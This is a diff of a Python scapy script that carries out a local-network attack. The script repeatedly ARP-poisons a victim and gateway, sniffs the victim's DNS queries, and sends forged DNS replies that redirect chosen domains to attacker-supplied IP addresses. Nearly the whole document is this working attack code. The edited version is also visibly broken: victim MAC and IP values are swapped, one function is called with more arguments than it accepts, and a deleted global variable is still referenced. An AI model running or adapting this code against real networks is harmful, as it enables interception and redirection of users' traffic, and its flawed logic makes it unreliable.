@@ -2,35 +2,31 @@ from scapy.all import *
 from arpPoison import *
 import time
 
-interface = "enp0s3"
-
-# victimNotInvolved = False
-# dnsQueryFromVictim = True
-
 
 def getDnsMsg(hwA,hwV,ipV,ipG,urlsToSpoof):
 
     print("sniffing")
-    tic = time.time()
-    arpPoison(hwA,hwV,ipV,ipG)
-
+    
     while(True):
-        toc = time.time()
-        if toc-tic > 0.2:
-            tic = toc
-            arpPoison(hwA,hwV,ipV,ipG)
-            print("-------------------ARP poisoning")
-	
-        pkt = sniff(count=1,iface="enp0s9",filter="udp port 53")[0]
+        arpPoison(hwA,hwV,ipV,ipG,interface)
+        pkt = sniff(count=1,iface="enp0s9",filter="udp port 53", timeout=0.2)
 
-        if pkt.haslayer(DNS):
+        if pkt:
+            packetFound = checkForDns(pkt[0],ipV,urlsToSpoof)
+            if packetFound:
+                return packetFound
+    
+def checkForDns(pkt,ipV,urlsToSpoof):
+    
+    if pkt.haslayer(DNS):
             dnsQueryFromVictim, goodUrl = getDnsMsgType(pkt,ipV,urlsToSpoof)
             print("packet found")
             return (pkt, dnsQueryFromVictim, goodUrl)
-        else:
-            print("bad packet")
+    else:
+        print("bad packet")
+        return ()
     
-    
+
 def getDnsMsgType(pkt,ipV,urlsToSpoof):
     
     if pkt[IP].src == ipV: 
@@ -43,46 +39,24 @@ def getDnsMsgType(pkt,ipV,urlsToSpoof):
     else: 
         return (False, False)
 
-# def dnsSpoofVictimQuery(pkt,goodUrl):
+def dnsPoisoning(interface,a,urlsToSpoof):
 
-#     pkt.show()
-
-#     return
-
-# def dnsPoisoningBad(urlsToSpoof):
-
-#     print("\nDNS poisoning attack\n")
-
-#     ipVictim = raw_input("Victim IP address: ")
-
-#     (pkt,dnsQueryFromVictim,goodUrl) = getDnsMsg(ipVictim,urlsToSpoof)
-    
-#     if dnsQueryFromVictim:
-#         dnsSpoofVictimQuery(pkt,goodUrl)
-#     else:
-#         pass
-
-    return
-
-def dnsPoisoning(urlsToSpoof):
+    hwA = a["attacker MAC"]
+    ipV = a["victim MAC"]
+    hwV = a["victim IP"]
+    ipG = a["gateway IP"]
 
     print("\nDNS poisoning attack\n")
 
-    global interface
-    interface = getInterface(interface)
+    while(True):
 
-    hwA = raw_input("Attacker MAC address: ")
-    ipV = raw_input("Victim IP address: ")
-    hwV = raw_input("Victim MAC address: ")
-    ipG = raw_input("Gateway IP address: ")
+        (pkt,dnsQueryFromVictim,goodUrl) = getDnsMsg(hwA,hwV,ipV,ipG,urlsToSpoof,interface)
 
-    (pkt,dnsQueryFromVictim,goodUrl) = getDnsMsg(hwA,hwV,ipV,ipG,urlsToSpoof)
-
-    if dnsQueryFromVictim and goodUrl:
+        if dnsQueryFromVictim and goodUrl:
 	
-        dnsResponse = dnsForgeResponse(pkt, urlsToSpoof)
-        dnsResponse.show()
-        sendp(dnsResponse, iface=interface)
+            dnsResponse = dnsForgeResponse(pkt, urlsToSpoof)
+            sendp(dnsResponse, iface=interface)
+            print("DNS response sent")
 
     return
 
@@ -130,52 +104,3 @@ def dnsForgeResponse(pkt, urlsToSpoof):
 	)
 
     return eth / ip / udp / dns
-
-####################################################################################################################################
-
-def showUrlsToSpoof(urlsToSpoof):
-    print("URLs to spoof:")
-    
-    for url in urlsToSpoof.keys():
-        print(url)
-
-    print("")
-    return
-
-def inputUrlsToSpoof(urlsToSpoof):
-
-    print("\ninput URLs to spoof")
-    print("after entering last URL, enter c to continue\n")    
-
-    def addUrls(urlsToSpoof):
-	
-        urlsToSpoof[user_in] = user_in_2
-        urlsToSpoof["*." + user_in] = user_in_2
-        urlsToSpoof["www." + user_in] = user_in_2
-
-        return urlsToSpoof
-    
-    while(True):
-        user_in = raw_input("URL to spoof: ")
-        user_in_split = user_in.split(".")
-    
-        if user_in == "c":
-            return urlsToSpoof
-    
-        elif len(user_in_split) == 2:
-            user_in_2 = raw_input("IP to use: ")
-            urlsToSpoof = addUrls(urlsToSpoof)
-
-        elif len(user_in_split) == 3:
-            user_in_2 = raw_input("IP to use: ")
-
-            if user_in_split[0] in ("*.", "www"):
-                del user_in_split[0]
-                user_in = ".".join(user_in_split)
-                urlsToSpoof = addUrls(urlsToSpoof)
-	
-            else:
-                urlsToSpoof[user_in] = user_in_2
-        
-        else:
-            print("Error: bad input \"" + str(user_in) + "\"")
